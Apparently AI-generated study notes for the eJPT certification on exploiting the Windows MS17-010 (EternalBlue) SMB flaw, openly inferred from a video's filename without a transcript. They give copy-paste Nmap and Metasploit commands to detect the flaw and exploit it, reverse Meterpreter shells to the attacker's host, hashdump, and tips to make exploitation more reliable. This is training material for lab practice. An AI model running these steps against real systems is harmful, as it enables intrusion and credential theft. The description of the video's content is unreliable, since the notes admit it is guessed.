# Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)

Note: No transcript was provided. The following summary is inferred from the filename and typical eJPT workflow for exploiting MS17-010 (EternalBlue). Commands and module names are standard and safe to assume for this topic.

## What the video covers (Introduction / big picture)
- Overview of MS17-010 (aka EternalBlue), a critical SMBv1 remote code execution vulnerability affecting Windows systems (notably Windows 7/Server 2008 R2 x64).
- How to identify a potentially vulnerable host via port scanning and SMB checks.
- Verifying vulnerability using Nmap and Metasploit scanner.
- Gaining a Meterpreter shell using Metasploit’s ms17_010_eternalblue exploit (primary) and ms17_010_psexec (fallback).
- Post-exploitation basics: verifying access, quick system info, and notes on stability/architecture.

## Flow (ordered)
1. Recon: Identify hosts with SMB open (TCP/445).
2. Detect MS17-010: Use Nmap NSE and/or Metasploit scanner to confirm vulnerability.
3. Confirm architecture: Target must be x64 for the ms17_010_eternalblue module.
4. Prepare listener/payload: Configure reverse Meterpreter (LHOST/LPORT).
5. Exploit with Metasploit:
   - Try exploit/windows/smb/ms17_010_eternalblue first.
   - If not compatible (e.g., 32-bit) or unstable, try exploit/windows/smb/ms17_010_psexec.
6. Obtain Meterpreter, verify SYSTEM privileges, and gather basic info.
7. Optional post-exploitation: hashdump, file access, persistence (lab-only).
8. Clean up.

## Tools highlighted
- Nmap with smb-vuln-ms17-010 and smb-os-discovery scripts
- Metasploit Framework:
  - auxiliary/scanner/smb/smb_ms17_010
  - exploit/windows/smb/ms17_010_eternalblue
  - exploit/windows/smb/ms17_010_psexec
- Optional helpers: smbclient (enumeration), whoami/sysinfo within Meterpreter

## Typical command walkthrough (detailed, copy-paste friendly)

Replace placeholders before running:
- <RHOST> = target IP (e.g., 10.10.10.10)
- <LHOST> = your IP for callbacks (e.g., tun0/vpn IP)
- <LPORT> = a free local port (e.g., 4444)

1) Quick discovery and vulnerability check
```
# Fast check for SMB and MS17-010
nmap -Pn -p445 --open -sV --script=smb-vuln-ms17-010,smb-os-discovery <RHOST>
```

2) Confirm with Metasploit scanner
```
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <RHOST>
set RPORT 445
run
```
- Look for “Vulnerable” or indicators of SMBv1 + MS17-010.

3) Exploit with EternalBlue (primary)
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <RHOST>
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
set VerifyArch true
set VerifyTarget true
check
run
```
- On success you should get a Meterpreter session as NT AUTHORITY\SYSTEM.

4) Fallback exploit if EternalBlue fails (e.g., 32-bit, instability)
```
back
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <RHOST>
set RPORT 445
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
check
run
```

5) Basic post-exploitation (from Meterpreter)
```
getuid
sysinfo
ipconfig
# Optional, be mindful in shared labs:
hashdump
```

6) Optional: one-liner msfconsole session to scan then exploit
```
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <RHOST>; run; back; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <RHOST>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set VerifyTarget true; check; run"
```

## Practical tips
- EternalBlue module requires x64 target (Windows 7/Server 2008 R2 x64 most common). If 32-bit, try ms17_010_psexec.
- Use check before run to reduce crashes and confirm likely success.
- If exploitation is flaky, increase WfsDelay or attempts:
  - set WfsDelay 15
  - set MaxExploitAttempts 3
- If you see “only supports x64 targets,” switch modules as above.
- If Nmap doesn’t clearly report vulnerability but Metasploit does (or vice versa), trust multiple indicators and try check/run once; avoid repeated runs to reduce BSOD risk.
- Make sure firewall isn’t blocking your reverse connection (verify LHOST/LPORT reachability).
- Run in an isolated lab only; this is a wormable vulnerability on unpatched systems.

## Minimal cheat sheet (one-screen flow)
```
# 1) Detect
nmap -Pn -p445 --open -sV --script=smb-vuln-ms17-010,smb-os-discovery <RHOST>

# 2) Metasploit scan
msfconsole -q
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <RHOST>
run

# 3) Exploit (x64 EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <RHOST>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
set VerifyTarget true
check
run

# 4) If fail/32-bit: fallback
back
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <RHOST>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
check
run

# 5) Post-exploit
getuid
sysinfo
```

## Summary
- MS17-010 (EternalBlue) is an unauthenticated RCE in SMBv1 widely exploited against older Windows systems.
- The standard eJPT workflow is: confirm SMB/port 445, validate MS17-010 with Nmap and/or Metasploit scanner, then exploit with ms17_010_eternalblue (x64) or ms17_010_psexec as fallback.
- Configure payload correctly (LHOST/LPORT), use check before run, and expect SYSTEM-level Meterpreter on success.
- Be cautious: EternalBlue can crash targets. Use only in controlled lab environments.